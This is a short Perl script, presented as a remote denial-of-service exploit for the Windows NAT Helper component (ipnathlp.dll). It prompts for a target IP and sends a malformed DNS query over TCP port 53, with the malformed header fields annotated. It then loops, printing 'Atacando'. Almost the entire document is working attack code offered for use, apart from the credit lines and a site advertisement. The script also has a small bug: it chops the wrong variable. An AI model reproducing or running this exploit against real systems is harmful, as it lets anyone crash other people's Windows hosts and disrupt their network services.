#!/usr/bin/perl
# Microsoft Windows NAT Helper Components (ipnathlp.dll) 0day Remote DoS Exploit
# Bug discovered by h07 <h07@interia.pl>
# Coded in Perl by Slappter & Ivanchuk
# Visit WwW.InformaticaVirtual.Info

use IO::Socket::INET;

$m = 1;

print "\nIP: ";
$host = <STDIN>;
chop($h);
$port = "53";

$buffer = "\x6c\xb6". # Transaction ID: 0x6cb6
"\x01\x00". # Flags: 0x0100 (Standard query)
"\x00\x00". # Questions: 0
"\x00\x00". # Answer RRs: 0
"\x00\x00". # Authority RRs: 0
"\x00\x00". # Additional RRs: 0 <-- Bug is here (0, 0, 0, 0)
"\x03\x77\x77\x77". #
"\x06\x67\x6f\x6f".#
"\x67\x6c\x65\x03". #
"\x63\x6f\x6d\x00". # Name: www.google.com
"\x00\x01". # Type: A (Host address)
"\x00\x01"; # Class: IN (0x0001)

while ($m == 1)
{
$socket = new IO::Socket::INET(Proto => "tcp", PeerAddr => $host, PeerPort => $port,) || die ("\nNo se pudo conectar\n");
print $socket $buffer;
print "\nAtacando ";
for ($x=0;$x<1000000000;$x++)
{
print ". ";
sleep(2);
}
}
close($socket);